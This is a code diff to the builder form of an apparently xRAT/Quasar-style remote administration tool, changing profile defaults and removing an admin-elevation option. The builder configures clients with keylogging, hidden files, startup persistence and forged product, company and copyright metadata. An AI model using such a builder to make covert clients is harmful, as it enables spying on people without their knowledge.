@@ -29,34 +29,35 @@ namespace xServer.Forms
             foreach (var host in HostHelper.GetHostsList(rawHosts))
                 _hosts.Add(host);
             lstHosts.DataSource = new BindingSource(_hosts, null);
-            txtPassword.Text = pm.ReadValue("Password");
-            txtDelay.Text = pm.ReadValue("Delay");
-            txtMutex.Text = pm.ReadValue("Mutex");
+            txtTag.Text = pm.ReadValueSafe("Tag", "Office04");
+            txtPassword.Text = pm.ReadValueSafe("Password", XMLSettings.Password);
+            txtDelay.Text = pm.ReadValueSafe("Delay", "5000");
+            txtMutex.Text = pm.ReadValueSafe("Mutex", FormatHelper.GenerateMutex());
             chkInstall.Checked = bool.Parse(pm.ReadValueSafe("InstallClient", "False"));
-            txtInstallname.Text = pm.ReadValue("InstallName");
-            GetInstallPath(int.Parse(pm.ReadValue("InstallPath"))).Checked = true;
-            txtInstallsub.Text = pm.ReadValue("InstallSub");
+            txtInstallname.Text = pm.ReadValueSafe("InstallName", "Client");
+            GetInstallPath(int.Parse(pm.ReadValueSafe("InstallPath", "1"))).Checked = true;
+            txtInstallsub.Text = pm.ReadValueSafe("InstallSub", "SubDir");
             chkHide.Checked = bool.Parse(pm.ReadValueSafe("HideFile", "False"));
             chkStartup.Checked = bool.Parse(pm.ReadValueSafe("AddStartup", "False"));
-            txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
-            chkElevation.Checked = bool.Parse(pm.ReadValueSafe("AdminElevation", "False"));
+            txtRegistryKeyName.Text = pm.ReadValueSafe("RegistryName", "Client Startup");
             chkIconChange.Checked = bool.Parse(pm.ReadValueSafe("ChangeIcon", "False"));
             chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValueSafe("ChangeAsmInfo", "False"));
             chkKeylogger.Checked = bool.Parse(pm.ReadValueSafe("Keylogger", "False"));
-            txtProductName.Text = pm.ReadValue("ProductName");
-            txtDescription.Text = pm.ReadValue("Description");
-            txtCompanyName.Text = pm.ReadValue("CompanyName");
-            txtCopyright.Text = pm.ReadValue("Copyright");
-            txtTrademarks.Text = pm.ReadValue("Trademarks");
-            txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
-            txtProductVersion.Text = pm.ReadValue("ProductVersion");
-            txtFileVersion.Text = pm.ReadValue("FileVersion");
+            txtProductName.Text = pm.ReadValueSafe("ProductName");
+            txtDescription.Text = pm.ReadValueSafe("Description");
+            txtCompanyName.Text = pm.ReadValueSafe("CompanyName");
+            txtCopyright.Text = pm.ReadValueSafe("Copyright");
+            txtTrademarks.Text = pm.ReadValueSafe("Trademarks");
+            txtOriginalFilename.Text = pm.ReadValueSafe("OriginalFilename");
+            txtProductVersion.Text = pm.ReadValueSafe("ProductVersion");
+            txtFileVersion.Text = pm.ReadValueSafe("FileVersion");
             _profileLoaded = true;
         }
 
         private void SaveProfile(string profilename)
         {
             ProfileManager pm = new ProfileManager(profilename + ".xml");
+            pm.WriteValue("Tag", txtTag.Text);
             pm.WriteValue("Hosts", HostHelper.GetRawHosts(_hosts));
             pm.WriteValue("Password", txtPassword.Text);
             pm.WriteValue("Delay", txtDelay.Text);
@@ -68,7 +69,6 @@ namespace xServer.Forms
             pm.WriteValue("HideFile", chkHide.Checked.ToString());
             pm.WriteValue("AddStartup", chkStartup.Checked.ToString());
             pm.WriteValue("RegistryName", txtRegistryKeyName.Text);
-            pm.WriteValue("AdminElevation", chkElevation.Checked.ToString());
             pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
             pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
             pm.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
@@ -85,16 +85,10 @@ namespace xServer.Forms
         private void FrmBuilder_Load(object sender, EventArgs e)
         {
             LoadProfile("Default");
-            if (string.IsNullOrEmpty(txtMutex.Text))
-            {
-                txtPort.Text = XMLSettings.ListenPort.ToString();
-                txtPassword.Text = XMLSettings.Password;
-                txtMutex.Text = FormatHelper.GenerateMutex();
-            }
+
+            txtPort.Text = XMLSettings.ListenPort.ToString();
 
             UpdateControlStates();
-
-            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
 
             ToggleAsmInfoControls();
         }
@@ -275,10 +269,9 @@ namespace xServer.Forms
                         }
 
                         ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
-                            txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked,
-                            chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked,
-                            int.Parse(txtDelay.Text),
-                            GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
+                            txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
+                            chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
+                            Application.ProductVersion);
 
                         MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
                             MessageBoxIcon.Information);
